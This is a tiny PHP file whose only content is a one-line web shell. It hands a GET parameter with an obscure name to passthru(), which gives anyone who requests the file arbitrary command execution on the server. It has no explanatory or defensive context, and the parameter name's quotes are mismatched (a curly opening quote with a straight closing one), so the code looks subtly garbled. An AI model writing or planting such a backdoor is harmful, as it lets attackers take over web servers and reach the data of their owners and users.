<?php
passthru($_GET[’3I_8uI-F']);
?>
